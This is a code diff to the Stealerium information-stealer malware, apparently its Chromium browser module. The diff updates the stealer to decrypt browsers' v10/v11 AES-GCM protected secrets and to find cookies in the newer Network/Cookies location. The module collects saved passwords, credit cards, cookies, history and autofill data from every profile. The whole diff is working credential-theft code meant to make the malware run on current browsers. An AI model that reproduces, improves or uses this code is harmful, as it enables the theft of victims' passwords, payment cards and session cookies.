@@ -3,6 +3,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Linq;
 using Stealerium.Stub.Helpers;
 
 namespace Stealerium.Stub.Target.Browsers.Chromium
@@ -190,33 +191,81 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
 
         public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
         {
-            if (bEncryptedData == null || bMasterKey == null || bEncryptedData.Length < 15)
+            if (bEncryptedData == null || bMasterKey == null || bEncryptedData.Length < 31)  // Need at least version(3) + iv(12) + data(min 16)
                 return null;
 
             try
             {
+                // Check version
+                var version = Encoding.ASCII.GetString(bEncryptedData, 0, 3);
+                if (!version.StartsWith("v10") && !version.StartsWith("v11"))
+                {
+                    Logging.Log($"Unsupported encryption version: {version}");
+                    return null;
+                }
+
+                // Extract IV (12 bytes) and encrypted data
                 byte[] bIv = new byte[12];
                 Array.Copy(bEncryptedData, 3, bIv, 0, 12);
 
+                // The remaining data includes both the ciphertext and the authentication tag
                 var bBuffer = new byte[bEncryptedData.Length - 15];
                 Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
 
                 if (bBuffer.Length <= 16)  // Need at least 16 bytes for the tag
+                {
+                    Logging.Log("Encrypted data too short");
                     return null;
+                }
 
+                // Split the buffer into ciphertext and authentication tag
                 var bTag = new byte[16];
                 var bData = new byte[bBuffer.Length - 16];
 
                 Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                 Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - 16);
 
-                var aDecryptor = new CAesGcm();
-                return aDecryptor.Decrypt(bMasterKey, bIv, null, bData, bTag);
+                try
+                {
+                    var aDecryptor = new CAesGcm();
+                    var decrypted = aDecryptor.Decrypt(bMasterKey, bIv, null, bData, bTag);
+                    
+                    // Verify the decrypted data is valid UTF-8
+                    if (decrypted != null && !IsValidUtf8(decrypted))
+                    {
+                        Logging.Log("Decrypted data is not valid UTF-8");
+                        return null;
+                    }
+                    
+                    return decrypted;
+                }
+                catch (Exception ex)
+                {
+                    Logging.Log($"AES-GCM decryption failed: {ex.Message}");
+                    return null;
+                }
             }
             catch (Exception ex)
             {
                 Logging.Log("Failed to decrypt with key: " + ex);
                 return null;
+            }
+        }
+
+        private static bool IsValidUtf8(byte[] data)
+        {
+            try
+            {
+                // Attempt to decode as UTF-8
+                var decoded = Encoding.UTF8.GetString(data);
+                // Re-encode to verify
+                var encoded = Encoding.UTF8.GetBytes(decoded);
+                // Compare lengths and content
+                return data.Length == encoded.Length && data.SequenceEqual(encoded);
+            }
+            catch
+            {
+                return false;
             }
         }
 
@@ -295,15 +344,39 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
                     sFullPath = Paths.Lappdata + sPath;
 
                 if (Directory.Exists(sFullPath))
+                {
+                    Logging.Log($"Found browser directory: {sFullPath}");
                     foreach (var sProfile in Directory.GetDirectories(sFullPath))
                     {
                         // Write chromium passwords, credit cards, cookies
                         var sBDir = sSavePath + "\\" + Crypto.BrowserPathToAppName(sPath);
                         Directory.CreateDirectory(sBDir);
+
+                        // Try to find cookies in new location first (Network/Cookies)
+                        string cookiesPath = Path.Combine(sProfile, "Network", "Cookies");
+                        if (!File.Exists(cookiesPath))
+                        {
+                            Logging.Log($"Cookies not found in new location: {cookiesPath}");
+                            // Fallback to old location
+                            cookiesPath = Path.Combine(sProfile, "Cookies");
+                            if (File.Exists(cookiesPath))
+                            {
+                                Logging.Log($"Found cookies in old location: {cookiesPath}");
+                            }
+                            else
+                            {
+                                Logging.Log($"Cookies not found in old location either: {cookiesPath}");
+                            }
+                        }
+                        else
+                        {
+                            Logging.Log($"Found cookies in new location: {cookiesPath}");
+                        }
+
                         // Run tasks
                         var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                         var pPasswords = Passwords.Get(sProfile + "\\Login Data");
-                        var pCookies = Cookies.Get(sProfile + "\\Cookies");
+                        var pCookies = Cookies.Get(cookiesPath);
                         var pHistory = History.Get(sProfile + "\\History");
                         var pDownloads = Downloads.Get(sProfile + "\\History");
                         var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
@@ -320,6 +393,7 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
                         CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                         CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                     }
+                }
             }
         }
     }
